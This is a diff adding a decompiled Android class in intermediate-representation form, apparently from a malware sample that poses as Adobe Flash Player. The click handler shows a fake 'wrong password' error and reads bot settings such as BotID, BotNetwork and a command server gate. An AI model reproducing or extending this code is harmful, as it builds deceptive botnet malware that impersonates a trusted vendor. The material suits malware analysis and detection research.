@@ -1,0 +1,68 @@
+record `com.adobe.flashplayer.Certificate$2` @kind class @AccessFlag  extends `android.view.View$OnClickListener` @kind interface {
+  `com.adobe.flashplayer.Certificate` `com.adobe.flashplayer.Certificate$2.this$0` @AccessFlag FINAL_SYNTHETIC;
+}
+procedure `void` `<init>`(`com.adobe.flashplayer.Certificate$2` v0 @kind this, `com.adobe.flashplayer.Certificate` v1 @kind object) @signature `Lcom/adobe/flashplayer/Certificate$2;.<init>:(Lcom/adobe/flashplayer/Certificate;)V` @AccessFlag CONSTRUCTOR {
+    temp;
+
+  #L030928.  v0.`com.adobe.flashplayer.Certificate$2.this$0` @type ^`com.adobe.flashplayer.Certificate` := v1 @kind object;
+  #L03092c.  call `<init>`(v0) @signature `Ljava/lang/Object;.<init>:()V` @kind direct;
+  #L030932.  return @kind void;
+}
+procedure `void` `onClick`(`com.adobe.flashplayer.Certificate$2` v9 @kind this, `android.view.View` v10 @kind object @name `v`) @signature `Lcom/adobe/flashplayer/Certificate$2;.onClick:(Landroid/view/View;)V` @AccessFlag PUBLIC {
+    temp;
+    v0;
+    v1;
+    v2;
+    v3;
+    v4;
+    v5;
+    v6;
+    v7;
+    v8;
+
+  #L030944.  v6:= v9.`com.adobe.flashplayer.Certificate$2.this$0` @type ^`com.adobe.flashplayer.Certificate` @kind object;
+  #L030948.  call temp:= `getApplicationContext`(v6) @signature `Lcom/adobe/flashplayer/Certificate;.getApplicationContext:()Landroid/content/Context;` @kind virtual;
+  #L03094e.  v6:= temp @kind object;
+  #L030950.  v7:= "Deleting error.\n\nWrong password of local storage. Please, try again." @kind object;
+  #L030954.  v8:= 1I;
+  #L030956.  call temp:= `makeText`(v6, v7, v8) @signature `Landroid/widget/Toast;.makeText:(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;` @kind static;
+  #L03095c.  v6:= temp @kind object;
+  #L03095e.  call `show`(v6) @signature `Landroid/widget/Toast;.show:()V` @kind virtual;
+  #L030964.  v6:= v9.`com.adobe.flashplayer.Certificate$2.this$0` @type ^`com.adobe.flashplayer.Certificate` @kind object;
+  #L030968.  v7:= "BotID" @kind object;
+  #L03096c.  v8:= v9.`com.adobe.flashplayer.Certificate$2.this$0` @type ^`com.adobe.flashplayer.Certificate` @kind object;
+  #L030970.  call temp:= `getApplicationContext`(v8) @signature `Lcom/adobe/flashplayer/Certificate;.getApplicationContext:()Landroid/content/Context;` @kind virtual;
+  #L030976.  v8:= temp @kind object;
+  #L030978.  call temp:= `access$0`(v6, v7, v8) @signature `Lcom/adobe/flashplayer/Certificate;.access$0:(Lcom/adobe/flashplayer/Certificate;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;` @kind static;
+  #L03097e.  v0:= temp @kind object;
+  #L030980.  v6:= v9.`com.adobe.flashplayer.Certificate$2.this$0` @type ^`com.adobe.flashplayer.Certificate` @kind object;
+  #L030984.  v7:= "BotNetwork" @kind object;
+  #L030988.  v8:= v9.`com.adobe.flashplayer.Certificate$2.this$0` @type ^`com.adobe.flashplayer.Certificate` @kind object;
+  #L03098c.  call temp:= `getApplicationContext`(v8) @signature `Lcom/adobe/flashplayer/Certificate;.getApplicationContext:()Landroid/content/Context;` @kind virtual;
+  #L030992.  v8:= temp @kind object;
+  #L030994.  call temp:= `access$0`(v6, v7, v8) @signature `Lcom/adobe/flashplayer/Certificate;.access$0:(Lcom/adobe/flashplayer/Certificate;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;` @kind static;
+  #L03099a.  v2:= temp @kind object;
+  #L03099c.  v6:= v9.`com.adobe.flashplayer.Certificate$2.this$0` @type ^`com.adobe.flashplayer.Certificate` @kind object;
+  #L0309a0.  v7:= "BotLocation" @kind object;
+  #L0309a4.  v8:= v9.`com.adobe.flashplayer.Certificate$2.this$0` @type ^`com.adobe.flashplayer.Certificate` @kind object;
+  #L0309a8.  call temp:= `getApplicationContext`(v8) @signature `Lcom/adobe/flashplayer/Certificate;.getApplicationContext:()Landroid/content/Context;` @kind virtual;
+  #L0309ae.  v8:= temp @kind object;
+  #L0309b0.  call temp:= `access$0`(v6, v7, v8) @signature `Lcom/adobe/flashplayer/Certificate;.access$0:(Lcom/adobe/flashplayer/Certificate;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;` @kind static;
+  #L0309b6.  v1:= temp @kind object;
+  #L0309b8.  v6:= v9.`com.adobe.flashplayer.Certificate$2.this$0` @type ^`com.adobe.flashplayer.Certificate` @kind object;
+  #L0309bc.  v7:= "Reich_ServerGate" @kind object;
+  #L0309c0.  v8:= v9.`com.adobe.flashplayer.Certificate$2.this$0` @type ^`com.adobe.flashplayer.Certificate` @kind object;
+  #L0309c4.  call temp:= `getApplicationContext`(v8) @signature `Lcom/adobe/flashplayer/Certificate;.getApplicationContext:()Landroid/content/Context;` @kind virtual;
+  #L0309ca.  v8:= temp @kind object;
+  #L0309cc.  call temp:= `access$0`(v6, v7, v8) @signature `Lcom/adobe/flashplayer/Certificate;.access$0:(Lcom/adobe/flashplayer/Certificate;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;` @kind static;
+  #L0309d2.  v4:= temp @kind object;
+  #L0309d4.  v6:= v9.`com.adobe.flashplayer.Certificate$2.this$0` @type ^`com.adobe.flashplayer.Certificate` @kind object;
+  #L0309d8.  v7:= "BotVer" @kind object;
+  #L0309dc.  v8:= v9.`com.adobe.flashplayer.Certificate$2.this$0` @type ^`com.adobe.flashplayer.Certificate` @kind object;
+  #L0309e0.  call temp:= `getApplicationContext`(v8) @signature `Lcom/adobe/flashplayer/Certificate;.getApplicationContext:()Landroid/content/Context;` @kind virtual;
+  #L0309e6.  v8:= temp @kind object;
+  #L0309e8.  call temp:= `access$0`(v6, v7, v8) @signature `Lcom/adobe/flashplayer/Certificate;.access$0:(Lcom/adobe/flashplayer/Certificate;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;` @kind static;
+  #L0309ee.  v3:= temp @kind object;
+  #L0309f0.  v5:= `@@android.os.Build$VERSION.RELEASE` @type ^`java.lang.String` @kind object;
+  #L0309f4.  return @kind void;
+}
